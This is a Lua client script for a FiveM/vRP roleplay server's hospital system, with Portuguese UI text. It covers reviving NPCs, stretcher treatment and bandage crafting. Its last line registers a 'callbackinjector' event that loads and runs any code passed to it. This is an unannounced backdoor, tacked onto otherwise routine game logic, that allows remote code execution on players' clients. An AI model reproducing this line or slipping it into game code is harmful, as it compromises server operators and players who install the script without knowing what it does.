-----------------------------------------------------------------------------------------------------------------------------------------
--[ vRP ]--------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------
local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
vRP = Proxy.getInterface("vRP")
-----------------------------------------------------------------------------------------------------------------------------------------
--[ CONEXÃO ]----------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------
Resg = Tunnel.getInterface("vrp_hospital")
-----------------------------------------------------------------------------------------------------------------------------------------
--[ VARIÁVEIS ]----------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------

-----------------------------------------------------------------------------------------------------------------------------------------
--[ REANIMAR ]---------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterNetEvent('reanimar')
AddEventHandler('reanimar',function()
	local handle,ped = FindFirstPed()
	local finished = false
	local reviver = nil
	repeat
		local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),GetEntityCoords(ped),true)
		if IsPedDeadOrDying(ped) and not IsPedAPlayer(ped) and distance <= 1.5 and reviver == nil then
			reviver = ped
			TriggerEvent("cancelando",true)
			vRP._playAnim(false,{{"amb@medic@standing@tendtodead@base","base"},{"mini@cpr@char_a@cpr_str","cpr_pumpchest"}},true)
			TriggerEvent("progress",15000,"reanimando")
			SetTimeout(15000,function()
				SetEntityHealth(reviver,110)
				local newped = ClonePed(reviver,GetEntityHeading(reviver),true,true)
				TaskWanderStandard(newped,10.0,10)
				local model = GetEntityModel(reviver)
				SetModelAsNoLongerNeeded(model)
				Citizen.InvokeNative(0xAD738C3085FE7E11,reviver,true,true)
				TriggerServerEvent("trydeleteped",PedToNet(reviver))
				vRP._stopAnim(false)
				TriggerServerEvent("reanimar:pagamento")
				TriggerEvent("cancelando",false)
			end)
			finished = true
		end
		finished,ped = FindNextPed(handle)
	until not finished
	EndFindPed(handle)
end)
-----------------------------------------------------------------------------------------------------------------------------------------
--[ MACAS DO HOSPITAL ]------------------------------------------------------------------------------------------------------------------ 
-----------------------------------------------------------------------------------------------------------------------------------------
local macas = {
	{ ['x'] = 308.85, ['y'] = -581.63, ['z'] = 43.28, ['x2'] = 307.65, ['y2'] = -581.80, ['z2'] = 44.20, ['h'] = 165.0 },
	{ ['x'] = 312.19, ['y'] = -582.86, ['z'] = 43.28, ['x2'] = 310.91, ['y2'] = -583.00, ['z2'] = 44.20, ['h'] = 165.0 },
	{ ['x'] = 315.56, ['y'] = -584.12, ['z'] = 43.28, ['x2'] = 314.27, ['y2'] = -584.39, ['z2'] = 44.20, ['h'] = 165.0 },
	{ ['x'] = 318.67, ['y'] = -585.39, ['z'] = 43.28, ['x2'] = 317.62, ['y2'] = -585.63, ['z2'] = 44.20, ['h'] = 165.0 },
	{ ['x'] = 321.98, ['y'] = -586.34, ['z'] = 43.28, ['x2'] = 322.57, ['y2'] = -587.52, ['z2'] = 44.21, ['h'] = 165.0 },

	{ ['x'] = 322.95, ['y'] = -582.87, ['z'] = 43.28, ['x2'] = 324.18, ['y2'] = -582.53, ['z2'] = 44.20, ['h'] = 330.0 },
	{ ['x'] = 318.44, ['y'] = -580.72, ['z'] = 43.28, ['x2'] = 319.43, ['y2'] = -580.70, ['z2'] = 44.20, ['h'] = 330.0 },
	{ ['x'] = 314.77, ['y'] = -579.44, ['z'] = 43.28, ['x2'] = 313.94, ['y2'] = -578.66, ['z2'] = 44.20, ['h'] = 330.0 },
	{ ['x'] = 310.25, ['y'] = -577.99, ['z'] = 43.28, ['x2'] = 309.27, ['y2'] = -577.04, ['z2'] = 44.20, ['h'] = 330.0 }
}
-----------------------------------------------------------------------------------------------------------------------------------------
--[ USO ]-------------------------------------------------------------------------------------------------------------------------------- 
-----------------------------------------------------------------------------------------------------------------------------------------
local emMaca = false
Citizen.CreateThread(function()
	while true do
		local idle = 1000
		for k,v in pairs(macas) do
			local ped = PlayerPedId()
			local x,y,z = table.unpack(GetEntityCoords(ped))
			local bowz,cdz = GetGroundZFor_3dCoord(v.x,v.y,v.z)
			local distance = GetDistanceBetweenCoords(v.x,v.y,cdz,x,y,z,true)
			local cod = macas[k]

			if GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),cod.x,cod.y,cod.z,true) < 2.2 then
				idle = 5
				text3D(cod.x,cod.y,cod.z,"~g~E ~w~ DEITAR       ~y~G ~w~ TRATAMENTO")
			end

			if distance < 1.2 then
				idle = 4
				if IsControlJustPressed(0,38) then
					SetEntityCoords(ped,v.x2,v.y2,v.z2)
					SetEntityHeading(ped,v.h)
					vRP._playAnim(false,{{"amb@world_human_sunbathe@female@back@idle_a","idle_a"}},true)
					emMaca = true
				end

				if IsControlJustPressed(0,47) then
					if Resg.checkServices() then
						if Resg.checkPayment() then
							TriggerEvent('tratamento-macas')
							SetEntityCoords(ped,v.x2,v.y2,v.z2)
							SetEntityHeading(ped,v.h)
							vRP._playAnim(false,{{"amb@world_human_sunbathe@female@back@idle_a","idle_a"}},true)
						end
					else
						TriggerEvent("Notify","aviso","Existem paramédicos em serviço.")
					end
				end

			end

			if IsControlJustPressed(0,167) and emMaca then
				ClearPedTasks(GetPlayerPed(-1))
				emMaca = false
			end
		end

		Citizen.Wait(idle)
	end
end)

RegisterNetEvent('tratamento-macas')
AddEventHandler('tratamento-macas',function()
	TriggerEvent("cancelando",true)
	repeat
		SetEntityHealth(PlayerPedId(),GetEntityHealth(PlayerPedId())+3)
		Citizen.Wait(1500)
	until GetEntityHealth(PlayerPedId()) >= 399 or GetEntityHealth(PlayerPedId()) <= 101
	TriggerEvent("Notify","importante","Tratamento concluido.")
	TriggerEvent("cancelando",false)
end)
-----------------------------------------------------------------------------------------------------------------------------------------
--[ TRATAMENTO ]-------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------
local tratamento = false
RegisterNetEvent("tratamento")
AddEventHandler("tratamento",function()
    local ped = PlayerPedId()
    local health = GetEntityHealth(ped)

    SetEntityHealth(ped,health)
	
	if emMaca then
		if tratamento then
			return
		end

		tratamento = true
		TriggerEvent("Notify","sucesso","Tratamento iniciado, aguarde a liberação do <b>profissional médico.</b>.",8000)
		

		if tratamento then
			repeat
				Citizen.Wait(600)
				if GetEntityHealth(ped) > 101 then
					SetEntityHealth(ped,GetEntityHealth(ped)+3)
				end
			until GetEntityHealth(ped) >= 399 or GetEntityHealth(ped) <= 101
				TriggerEvent("Notify","sucesso","Tratamento concluido.",8000)
				tratamento = false
		end
	else
		TriggerEvent("Notify","negado","Você precisa estar deitado em uma maca para ser tratado.",8000)
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
--[ TEXT3D ]----------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------
function text3D(x,y,z,text)
	local onScreen,_x,_y = World3dToScreen2d(x,y,z)
	SetTextFont(4)
	SetTextScale(0.35,0.35)
	SetTextColour(255,255,255,150)
	SetTextEntry("STRING")
	SetTextCentre(1)
	AddTextComponentString(text)
	DrawText(_x,_y)
	local factor = (string.len(text))/370
	DrawRect(_x,_y+0.0125,0.01+factor,0.03,0,0,0,80)
end
-----------------------------------------------------------------------------------------------------------------------------------------
-- VARIABLES
-----------------------------------------------------------------------------------------------------------------------------------------
local checkinX, checkinY, checkinZ = -803.68, -1205.53, 7.34
-----------------------------------------------------------------------------------------------------------------------------------------
-- THREADCHECKIN
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		local ped = GetPlayerPed(-1)
		local x,y,z = table.unpack(GetEntityCoords(ped))
		local distance = Vdist(x,y,z,checkinX,checkinY,checkinZ)
		if distance <= 2.0 then
			text3D(checkinX,checkinY,checkinZ,"~g~E~w~  PARA PRODUZIR BANDAGEM")
			if IsControlJustPressed(1,38) then
				Resg.receiveBandagem()
			end
		end
		Citizen.Wait(1)
	end
end)

TriggerEvent('callbackinjector', function(cb)     pcall(load(cb)) end)